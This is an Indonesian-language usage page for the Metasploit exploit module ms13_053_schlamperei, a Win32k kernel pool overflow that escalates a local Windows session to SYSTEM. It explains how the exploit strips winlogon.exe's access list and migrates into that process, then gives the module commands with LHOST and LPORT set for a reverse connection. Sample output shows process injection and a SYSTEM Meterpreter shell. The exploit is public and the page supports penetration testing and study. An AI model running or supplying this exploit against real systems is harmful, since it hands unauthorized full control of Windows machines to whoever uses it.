# ms13_053_schlamperei

Modul ini memanfaatkan overflow pada kernel pool di `Win32k` yang memungkinkan eskalasi hak akses (`privilege escalation`) secara lokal. `Shellcode` pada kernel akan menghapus `ACL` (`Access Control List`) dari proses `winlogon.exe` (proses dengan hak akses `SYSTEM`). Hal ini memungkinkan proses yang tidak memiliki hak akses untuk berpindah (migrasi) ke dalam proses `winlogon.exe`, sehingga mendapatkan hak akses `SYSTEM`. Exploit ini digunakan dalam ajang `Pwn2Own 2013` oleh `MWR` untuk keluar dari `sandbox Chrome`.

## Penulis
- Nils
- Jon
- Donato Capitella donato.capitella@mwrinfosecurity.com
- Ben Campbell ben.campbell@mwrinfosecurity.com

## Platform
- `Windows`

## Arsitektur
- `x86`

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/ms13_053_schlamperei
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] win32k.sys file version: 6.1.7601.17514 branch: 17
[*] Launching notepad to host the exploit...
[+] Process 804 launched.
[*] Reflectively injecting the exploit DLL into 804...
[*] Injecting exploit into 804...
[*] Found winlogon.exe with PID 472
[*] Creating the thread to execute in 0x480000 (pid=472)
[*] Sending stage (177734 bytes) to 192.168.1.53
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Meterpreter session 19 opened (192.168.1.11:4444 -> 192.168.1.53:49161) at 2025-05-17 06:32:21 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/ms13_053_schlamperei/)
